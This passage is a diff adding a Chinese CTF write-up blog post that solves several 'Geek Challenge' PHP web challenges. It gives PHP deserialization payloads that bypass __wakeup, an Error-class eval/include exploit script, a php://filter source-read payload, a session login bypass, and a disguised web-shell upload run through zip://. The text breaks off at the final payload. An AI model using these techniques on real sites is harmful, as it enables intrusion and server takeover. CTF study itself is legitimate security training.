@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">87</span></a>
 
   </li>
   </ul>
@@ -156,6 +156,240 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/" class="post-title-link" itemprop="url">极客大挑战php代码审计题集(web部分)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-11-30 15:20:23 / 修改时间：16:08:44" itemprop="dateCreated datePublished" datetime="2023-11-30T15:20:23+08:00">2023-11-30</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="极客大挑战-PHP代码审计题集"><a href="#极客大挑战-PHP代码审计题集" class="headerlink" title="极客大挑战|PHP代码审计题集"></a>极客大挑战|PHP代码审计题集</h1><p>[[极客大挑战 2019]PHP](#[极客大挑战 2019]PHP)</p>
+<p>[[极客大挑战 2020]Greatphp](#[极客大挑战 2020]Greatphp)</p>
+<p> [[极客大挑战 2020]Roamphp1-Welcome](#[极客大挑战 2020]Roamphp1-Welcome)</p>
+<p>[[极客大挑战 2020]Roamphp2-Myblog](#[极客大挑战 2020]Roamphp2-Myblog)</p>
+<h3 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h3><p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130152843471.png" alt="image-20231130152843471"></p>
+<p>没有输入，源码什么提示都没；最后只好进行目录扫描</p>
+<p>​    这里用dirsearch工具扫描出<a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a>文件，自带字典比较大，非常耗时；可以自己上github找一下轻量级的。</p>
+<p>​    解压后包括以下文件：index.php、flag.php、index.js、class.php、style.css。</p>
+<p>l  Flag.php</p>
+<p>显然这里的flag是假的</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130152940597.png" alt="image-20231130152940597"></p>
+<p>l  Class.php</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130153012262.png" alt="image-20231130153012262"></p>
+<p>Php中，“__”开头的自带函数名，几乎都是魔法函数。魔法函数会在程序启动时，符合条件就自动执行。</p>
+<p>​    从class.php的代码可以得到要想得到flag，就要进入__destruct()方法的第二个if语句，即传入的参数：password == 100，username === ‘admin’。需要注意的是__wakeup()在这里也是魔法函数，会自动执行，将username = ‘guest’；因此需要绕过__wakeup()。</p>
+<p> **__wakeup()**：当类外部使用<code>unserialize()</code> 时，会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup</code> 方法，预先准备对象需要的资源</p>
+<p>l  Index.php</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130153127054.png" alt="image-20231130153127054"></p>
+<p>​        从这里可以知道，这里使用了get方法获取select变量。那么可以通过通过select参数进行传值（传入payload）。需要注意的是这里引用了unserialize()，对传入变量select进行了反序列化，所以要传入序列化值。</p>
+<p>​        到这里就清楚了解题思路了；将“password = 100，username = ‘admin’ ”转化为php序列化数据传给select变量。</p>
+<p>根据php序列化格式，构造payload如下：</p>
+<p><strong>O:4:”Name”:2:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</strong></p>
+<p>但是要绕过wakeup()，特意将变量个改为3。最后的payload为</p>
+<p><strong>O:4:”Name”:3:{s:14:”%00Name%00username”;s:5:”admin”;s:14:”%00Name%00password”;i:100;}</strong></p>
+<p>获取到flag</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130153207188.png" alt="image-20231130153207188"></p>
+<p>参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/366455343">https://zhuanlan.zhihu.com/p/366455343</a></p>
+<h4 id="PHP序列化格式"><a href="#PHP序列化格式" class="headerlink" title="PHP序列化格式"></a>PHP序列化格式</h4><p><strong>格式：</strong>对象类型:长度:”类名”:类中变量的个数:{类型:长度:”值”;类型:长度:”值”;……}</p>
+<p>如：O:4:”User”:2:{s:3:”age”;i:20;s:4:”name”;s:4:”daye”;}</p>
+<p>注意：这里的O是大写的字母o，不是数字0</p>
+<p># 变量及对象类型参考</p>
+<p>a - array     b - boolean</p>
+<p>d - double     i - integer</p>
+<p>o - common object   r - reference</p>
+<p>s - string     C - custom object</p>
+<p>O - class     N - null</p>
+<p>R - pointer reference  U - unicode string</p>
+<p>另外，<strong>private 声明的字段在序列化时，需要注意</strong>：</p>
+<ul>
+<li>private声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。</li>
+<li>因此私有字段的字段名在序列化时，类名和字段名前面都会加上\0（即%00）的前缀。字符串长度也包括所加前缀的长度，如下</li>
+</ul>
+<p>O:4:”User”:2:{s:9:”%00User%00age”;i:20;s:10:”%00User%00name”;s:4:”daye”;}  # 9=7+2 10=8</p>
+<h4 id="wakeup-函数的绕过方法："><a href="#wakeup-函数的绕过方法：" class="headerlink" title="_wakeup()函数的绕过方法："></a>_wakeup()函数的绕过方法：</h4><p>（1）当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</p>
+<p>标准序列化结果</p>
+<p>O:4:”User”:2:{s:8:”username”;s:4:”wenda”;s:8:”password”;s:4:”wenda”;}</p>
+<p>将2改为3 绕过__Wakeup魔法函数</p>
+<p>O:4:”User”:3:{s:8:”username”;s:4:”wenda”;s:8:”password”;s:4:”wenda”;}</p>
+<p>(2)使用C绕过</p>
+<p>使用C代替O能绕过_wakeup(),但那样的话只能执行construct()函数或者destruct()函数，无法添加任何内容</p>
+<p>注意：使用C绕过有版本要求</p>
+<p>以上为常见的绕过方法 更深入的参考大佬文章：<a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/">https://fushuling.com/index.php/2023/03/11/php%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%adwakeup%e7%bb%95%e8%bf%87%e6%80%bb%e7%bb%93/</a></p>
+<h3 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h3><p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130153315896.png" alt="image-20231130153315896"></p>
+<p><strong>思路：</strong></p>
+<p>1.看到unserialize（），__wakeup()；断定需要利用反序列化获取flag。</p>
+<p>2.绕过2个if语句，利用eval（）命令执行获取flag</p>
+<p>3.如何通过<code>eval（）</code>获取flag？利用include（）文件包含漏洞。</p>
+<p>4.include（）需要知道目录，先猜，如flag.php、/flag、flag.txt等；最后再爆破。</p>
+<p><strong>难题（需要绕过）：</strong></p>
+<h4 id="绕过：值不等，但md5值等且sha1值相等"><a href="#绕过：值不等，但md5值等且sha1值相等" class="headerlink" title="绕过：值不等，但md5值等且sha1值相等"></a>绕过：值不等，但md5值等且sha1值相等</h4><p><strong>问题1</strong>、第一个if语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if( ($this-&gt;syc !&#x3D; $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) &#x3D;&#x3D;&#x3D; md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)&#x3D;&#x3D;&#x3D; sha1($this-&gt;lover)) )</span><br></pre></td></tr></table></figure>
+<p><strong>说明：</strong>变量syc值不等于lover，但是syc与lover两个变量的md5值与sha1值要相同。</p>
+<p><strong>方法：</strong>Error类报错相同返回值绕过</p>
+<p>Error类中有__tostring方法，md5()和sha1()函数都会调用__tostring()；可以将题目代码中的 $syc 和 $lover 分别声明为类似上面的内置类的对象，让这两个对象本身不同（传入的错误代码即可），只要__toString 方法输出的结果相同即可。如下</p>
+<p>​        <strong>Syc = new Error(payload1 , 1); lover = new Error(payload2 , 2)</strong></p>
+<p>注意：这里Error类报错返回值为0。($this-&gt;syc != $this-&gt;lover)是直接比较2个字符串；而md5（）和sha1（），会先计算syc和lover的值，即md5（0）和sha1（0）；</p>
+<pre><code> 问题1的payload1和payload2是要放入eval（）执行的命令，payload1或payload2只要随便一个要执行的命令就可以了，是否相等都无所谓。**这里要利用include（）获取flag，若flag的目录是/flag**；则初步payload为：</code></pre>
+<p><strong>初步Payload = “?&gt;<?=include"/flag"?>“;</strong></p>
+<p>注意：这里构造的payload考虑了闭合问题。</p>
+<p><strong>问题2</strong>：第二个if语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!preg_match(&quot;&#x2F;\&lt;\?php|\(|\)|\&quot;|\&#39;&#x2F;&quot;, $this-&gt;syc, $match))</span><br></pre></td></tr></table></figure>
+<p>说明：对syc经过了正则化，变量过滤了”/&lt;?php|(|)|&quot;|&#39;/“等字符</p>
+<p>​        但是由于禁用来引号**Payload = “?&gt;<?=include"/flag"?>“;**不能直接用，可以利用url编码取反法绕过。</p>
+<p><strong>Payload = “?&gt;<?=include~".urldecode("%d0%99%93%9e%98")."?>“;</strong></p>
+<p><strong>然后直接手动构造序列化？手动？</strong></p>
+<p><strong>否，首先Error原生类是调用了魔法函数__toString()，返回的内容也需要写到payload里的，其次可以进行一些urlencode编码，避免一些不注意的不可见字符导致失败。</strong></p>
+<p><strong>所以写脚本跑出payload；这里直接贴网上别人写好的脚本（这里的str就是上面的payload）</strong></p>
+<p>Payload脚本：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class SYCLOVER &#123;</span><br><span class="line"></span><br><span class="line">  public $syc;</span><br><span class="line"></span><br><span class="line">  public $lover;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str &#x3D; &quot;?&gt;&lt;?&#x3D;include~&quot;.urldecode(&quot;%d0%99%93%9e%98&quot;).&quot;?&gt;&quot;;</span><br><span class="line">$a&#x3D;new Error($str,1);$b&#x3D;new Error($str,2);</span><br><span class="line">$c &#x3D; new SYCLOVER();</span><br><span class="line">$c-&gt;syc &#x3D; $a;</span><br><span class="line">$c-&gt;lover &#x3D; $b;</span><br><span class="line">echo urlencode(serialize($c));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p><strong>获得最后payload</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A15%3A%22%2Fbox%2Fscript.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A14%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A15%3A%22%2Fbox%2Fscript.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A14%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D</span><br></pre></td></tr></table></figure>
+
+
+<p>如果没有url编码的序列化数据如下：</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130154450717.png" alt="image-20231130154450717"></p>
+<p>所以要进行一些url编码，然后拿到flag</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130154504505.png" alt="image-20231130154504505"></p>
+<h3 id="极客大挑战-2020-Roamphp1-Welcome"><a href="#极客大挑战-2020-Roamphp1-Welcome" class="headerlink" title="[极客大挑战 2020]Roamphp1-Welcome"></a>[极客大挑战 2020]Roamphp1-Welcome</h3><p>直接点击连接，上面都没有。Bp抓包，将GET请求改为POST请求，获得界面</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130154726258.png" alt="image-20231130154726258"></p>
+<p><strong>思路：</strong></p>
+<p>解决下面的if语句条件，即可查看到pnpinfo（）</p>
+<p>问题：roam1与roam2的值不同，但两者的sha1值相同。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if ($_POST[&#39;roam1&#39;] !&#x3D;&#x3D; $_POST[&#39;roam2&#39;] &amp;&amp; sha1($_POST[&#39;roam1&#39;]) &#x3D;&#x3D;&#x3D; sha1($_POST[&#39;roam2&#39;]))</span><br></pre></td></tr></table></figure>
+<p><strong>方法：</strong>sha1（）无法处理数组，会返回null，所以全等；可以通过post请求传入数组roam1[]和roam2[]。</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130154850115.png" alt="image-20231130154850115"></p>
+<h3 id="极客大挑战-2020-Roamphp2-Myblog"><a href="#极客大挑战-2020-Roamphp2-Myblog" class="headerlink" title="[极客大挑战 2020]Roamphp2-Myblog"></a>[极客大挑战 2020]Roamphp2-Myblog</h3><p>代码、网页都没有发现什么，登录界面也没有东西，且不能注册。观察url，发现每个页面的url都传了一个page变量。</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130154926437.png" alt="image-20231130154926437"></p>
+<p>尝试文件包含，先试试传一个/etc/passwd，无果。</p>
+<p><strong>思路：</strong>伪协议</p>
+<p>l  <strong>步骤1：通过php伪协议查看源码</strong></p>
+<p><strong>尝试查看源码payload：</strong></p>
+<p>?page=php://filter/read=convert.base64-encode/resource=login</p>
+<p><strong>Php伪协议知识：<a target="_blank" rel="noopener" href="https://www.php.cn/faq/481803.html">https://www.php.cn/faq/481803.html</a></strong></p>
+<p><strong>注意</strong>：通过查看每个页面的page参数可以发现，不用加后缀，这可能是后台自己添加后缀了；即是login而不是login.php，</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130155012094.png" alt="image-20231130155012094"></p>
+<p>从payload可以得知，返回的内容是 经过base64编码的；所以需要进行base64解码</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130155051525.png" alt="image-20231130155051525"></p>
+<p>获取到login.php源</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line">mt_srand(<span class="variable">$secret_seed</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>] = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>PS</strong>：这里可以知道，<strong>密码是利用cookie的session产生的随机数。</strong></p>
+<p>利用同样的方法获取关键页面的源码，如由login.php发现secret.php。</p>
+<p>secret.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$secret_seed</span> = mt_rand();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​        到这里也没有进一步的思路；到登录界面尝试弱口令；发现奇怪的新页面“admin/user”；获取其源码（2段）。</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130155548601.png" alt="image-20231130155548601"></p>
+<p>Admin/user.php第一段源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(_POST[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>(_POST[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span> (_POST[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;Longlone&quot;</span> <span class="keyword">and</span> POST[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123; <span class="comment">// No one knows my password, including myself</span></span><br><span class="line"><span class="variable">$logined</span> = <span class="literal">true</span>;</span><br><span class="line">    _SESSION[<span class="string">&#x27;status&#x27;</span>] = logined;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (logined === <span class="literal">false</span> &amp;&amp; !<span class="keyword">isset</span>(SESSION[<span class="string">&#x27;status&#x27;</span>]) || <span class="variable">$SESSION</span>[<span class="string">&#x27;status&#x27;</span>] !== <span class="literal">true</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>PS</strong>：知道<strong>username=== “Longlone”**，</strong>password是随机的，即没发输入正确密码。得想办法绕过。**</p>
+<p>​        根据Admin/user.php第一段源码和login.php可以知道；password是随着cookie传进去的，如果cookie中为空，那么我们也传一个空密码，再后台判断中也就相同了。$__POST[‘password’] == $___SESSION[‘password’]</p>
+<p><strong>解决办法：</strong></p>
+<p><strong>Username</strong>：Longlone</p>
+<p>*<em>Password**</em>：可以通过传入空cookie来绕过密码</p>
+<p>l  <strong>步骤2：登录绕过</strong></p>
+<p>利用bp抓包并修改，（密码可以先随便输入）</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160147615.png" alt="image-20231130160147615"></p>
+<p><strong>登录成功并发现文件上传点</strong></p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160200631.png" alt="image-20231130160200631"></p>
+<p>l  <strong>步骤3：上传木马文件</strong></p>
+<p>Admin/user.php第二段源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(_FILES[<span class="string">&#x27;Files&#x27;</span>]) <span class="keyword">and</span> _SESSION[<span class="string">&#x27;status&#x27;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">  tmp_file = _FILES<span class="string">&#x27;Files&#x27;</span>;</span><br><span class="line">  tmp_path = _FILES<span class="string">&#x27;Files&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>((extension = pathinfo(tmp_file)[<span class="string">&#x27;extension&#x27;</span>]) != <span class="string">&quot;&quot;</span>)&#123;<span class="comment">//判断extension**，也就是文件后缀名是否为空</span></span><br><span class="line">    <span class="variable">$allows</span> = <span class="keyword">array</span>(<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);<span class="comment">//**白名单</span></span><br><span class="line">    <span class="keyword">if</span>(in_array(extension,allows,<span class="literal">true</span>) <span class="keyword">and</span> in_array(_FILES[<span class="string">&#x27;Files&#x27;</span>] [<span class="string">&#x27;type&#x27;</span>],array_map(<span class="function"><span class="keyword">function</span>(<span class="params">ext</span>)</span>&#123;<span class="keyword">return</span> <span class="string">&#x27;image/&#x27;</span>.ext;&#125;,allows),<span class="literal">true</span>))&#123;</span><br><span class="line">        upload_name = sha1(md5(uniqid(microtime(<span class="literal">true</span>), <span class="literal">true</span>))).<span class="string">&#x27;.&#x27;</span>.extension;</span><br><span class="line">        move_uploaded_file(tmp_path,<span class="string">&quot;assets/img/upload/&quot;</span>.upload_name);<span class="comment">//**移动文件并改文件名</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like &#x27;gif&#x27;, &#x27;jpeg&#x27;, &#x27;jpg&#x27;, &#x27;png&#x27; &#x27;) &lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>PS</strong>：知道文件上传白名单**’gif’,’jpeg’,’jpg’,’png’。**</p>
+<p><strong>PS：</strong>可以将php文件打包成zip，改后缀名为jpg，再利用<code>zip</code>伪协议进行读取。zip协议是可以解压缩jpg后缀的压缩包的。</p>
+<p>l  <strong>Zip协议：</strong>zip:// + zip路径 + %23 + php文件名 (由于#在get请求中会将后面的参数忽略所以使用get请求时候应进行url编码为%23)</p>
+<p>​        它采取了白名单的方式只允许图片后缀上传，这里不能使用图片马+文件包含，因为根据访问源码不用加后缀可以猜测到它的文件包含页面逻辑会给所有文件名都加上.php后缀。除了可以使用zip协议，也可以利用phar协议。</p>
+<h4 id="自动加后缀利用方法"><a href="#自动加后缀利用方法" class="headerlink" title="自动加后缀利用方法"></a>自动加后缀利用方法</h4><p>l  <strong>phar://协议：</strong>无论文件是什么后缀，phar://协议都将会把它作为压缩包解压。需要注意的是php&gt;=5.3.0,需要zip协议压缩，rar等其他协议不行，这里同时zip协议是可以解压缩jpg后缀的压缩包的。</p>
+<p><strong>解决方法：</strong>写一个php一句话木马（shell.php），利用zip协议压缩为shell.zip，然后修改为白名单的后缀（例如如shell.png），再上传。</p>
+<p>一句话木马如下：</p>
+<img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160559405.png" alt="image-20231130160559405" style="zoom:50%;">
+
+<p>上传成功返回了（相对）文件路径</p>
+<p><img src="/2023/11/30/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E9%A2%98%E9%9B%86-web%E9%83%A8%E5%88%86/image-20231130160616730.png" alt="image-20231130160616730"></p>
+<p>l  <strong>步骤4：命令执行获取flag</strong></p>
+<p><strong>查看根目录</strong></p>
+<ul>
+<li><strong>zip协议：</strong></li>
+</ul>
+<p><strong>Payload</strong>：</p>
+<p><strong>page=zip://./assets/img/upload/901edcb2cb7e73704f556f4c50d8b1ee3e7f428d.jpg%23shell</strong></p>
